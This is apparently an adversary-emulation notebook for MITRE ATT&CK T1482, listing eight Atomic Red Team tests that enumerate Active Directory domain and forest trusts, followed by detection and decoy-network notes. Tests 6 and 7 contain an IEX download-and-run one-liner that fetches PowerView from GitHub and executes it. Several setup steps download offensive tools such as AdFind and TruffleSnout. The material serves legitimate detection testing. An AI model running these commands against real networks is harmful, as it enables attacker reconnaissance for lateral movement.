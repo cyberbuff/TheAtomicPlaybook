{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "036a4d11",
   "metadata": {},
   "source": "# T1482 - Domain Trust Discovery\nAdversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.(Citation: Microsoft Trusts) Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct [SID-History Injection](https://attack.mitre.org/techniques/T1134/005), [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003), and [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).(Citation: AdSecurity Forging Trust Tickets)(Citation: Harmj0y Domain Trusts) Domain trusts can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call, .NET methods, and LDAP.(Citation: Harmj0y Domain Trusts) The Windows utility [Nltest](https://attack.mitre.org/software/S0359) is known to be used by adversaries to enumerate domain trusts.(Citation: Microsoft Operation Wilysupply)"
  },
  {
   "cell_type": "markdown",
   "id": "875856eb",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "b8a00cf3",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Windows - Discover domain trusts with dsquery",
    "Uses the dsquery command to discover domain trusts.\nRequires the installation of dsquery via Windows RSAT or the Windows Server AD DS role.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\ndsquery * -filter \"(objectClass=trustedDomain)\" -attr *\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "21f768f7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1482 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "504e1a02",
   "metadata": {},
   "source": "### Atomic Test #2 - Windows - Discover domain trusts with nltest\nUses the nltest command to discover domain trusts.\nRequires the installation of nltest via Windows RSAT or the Windows Server AD DS role.\nThis technique has been used by the Trickbot malware family.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `command_prompt`!\n##### Description: nltest.exe from RSAT must be present on disk\n\n##### Check Prereq Commands:\n```cmd\nWHERE nltest.exe >NUL 2>&1\n\n```\n##### Get Prereq Commands:\n```cmd\necho Sorry RSAT must be installed manually\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b2056058",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1482 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "d589ee1b",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nnltest /domain_trusts\nnltest /trusted_domains\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fdd99eb0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1482 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "9fcaff0c",
   "metadata": {},
   "source": "### Atomic Test #3 - Powershell enumerate domains and forests\nUse powershell to enumerate AD information.\nRequires the installation of PowerShell AD admin cmdlets via Windows RSAT or the Windows Server AD DS role.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: PowerView PowerShell script must exist on disk\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\"\n\n```\n##### Description: RSAT PowerShell AD admin cmdlets must be installed\n\n##### Check Prereq Commands:\n```powershell\nif ((Get-Command \"Get-ADDomain\" -ErrorAction Ignore) -And (Get-Command \"Get-ADGroupMember\" -ErrorAction Ignore)) { exit 0 } else { exit 1 }\n\n```\n##### Get Prereq Commands:\n```powershell\nWrite-Host \"Sorry RSAT must be installed manually\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1067b368",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1482 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "7c4ff8f6",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nImport-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\"\nGet-NetDomainTrust\nGet-NetForestTrust\nGet-ADDomain\nGet-ADGroupMember Administrators -Recursive\n([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "54adb4f5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1482 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "c80f10de",
   "metadata": {},
   "source": "### Atomic Test #4 - Adfind - Enumerate Active Directory OUs\nAdfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory OUs\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe)\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "dd4b99ba",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1482 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "731edc0d",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=organizationalUnit)\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "31fb2ea4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1482 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "ce663b91",
   "metadata": {},
   "source": "### Atomic Test #5 - Adfind - Enumerate Active Directory Trusts\nAdfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Trusts\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe)\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a613f601",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1482 -TestNumbers 5 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "33100237",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -gcb -sc trustdmp\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9e9458c7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1482 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "bb2a0d1c",
   "metadata": {},
   "source": [
    "### Atomic Test #6 - Get-DomainTrust with PowerView",
    "Utilizing PowerView, run Get-DomainTrust to identify domain trusts. Upon execution, progress and info about trusts within the domain being scanned will be displayed.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainTrust -Verbose\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ef6c0ec0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1482 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "d89f9453",
   "metadata": {},
   "source": [
    "### Atomic Test #7 - Get-ForestTrust with PowerView",
    "Utilizing PowerView, run Get-ForestTrust to identify forest trusts. Upon execution, progress and info about forest trusts within the domain being scanned will be displayed.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust -Verbose\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a4f1ac50",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1482 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "c6883db6",
   "metadata": {},
   "source": "### Atomic Test #8 - TruffleSnout - Listing AD Infrastructure\nIterative AD discovery toolkit for offensive operators. Situational awareness and targeted low noise enumeration. Preference for OpSec.- https://github.com/dsnezhkov/TruffleSnout\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: TruffleSnout.exe must exist on disk at specified location (#{trufflesnout_path})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\TruffleSnout.exe\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -ItemType Directory (Split-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\TruffleSnout.exe\") -Force | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/dsnezhkov/TruffleSnout/releases/download/0.5/TruffleSnout.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\TruffleSnout.exe\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "999057e6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1482 -TestNumbers 8 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "1b679d01",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\TruffleSnout.exe\" forest -n %userdomain%\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\TruffleSnout.exe\" domain -n %userdomain%\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9dc83ab4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1482 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "0288f050",
   "metadata": {},
   "source": "## Detection\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information, such as `nltest /domain_trusts`. Remote access tools with built-in features may interact directly with the Windows API to gather information. Look for the `DSEnumerateDomainTrusts()` Win32 API call to spot activity associated with [Domain Trust Discovery](https://attack.mitre.org/techniques/T1482).(Citation: Harmj0y Domain Trusts) Information may also be acquired through Windows system management tools such as [PowerShell](https://attack.mitre.org/techniques/T1059/001). The .NET method `GetAllTrustRelationships()` can be an indicator of [Domain Trust Discovery](https://attack.mitre.org/techniques/T1482).(Citation: Microsoft GetAllTrustRelationships)\n"
  },
  {
   "cell_type": "markdown",
   "id": "30d78606",
   "metadata": {},
   "source": "\n## Shield Active Defense\n### Decoy Network \n Create a target network with a set of target systems, for the purpose of active defense.\n \n\n Decoy networks are comprised of multiple computing resources that can be used for defensive or deceptive purposes.  A decoy network can be used to safely perform dynamic analysis of suspected malicious code. A defender can also use a specially crafted decoy network to perform adversary engagement. \n#### Opportunity\nThere is an opportunity to extend an adversary's engagement period by creating a decoy network that systems can discover when performing trust discovery.\n#### Use Case\nA defender can create a decoy network that contains systems\u00a0which are easily discoverable and appealing to an adversary.\n#### Procedures\nCreate an isolated network populated with decoy systems that can be used to study an adversary's tactics, techniques, and procedures (TTPs).\nUse a segregated network to visit a compromised site.  If the machine becomes infected, allow the machine to remain on with internet access to see if an adversary engages and takes action on the system.\n"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}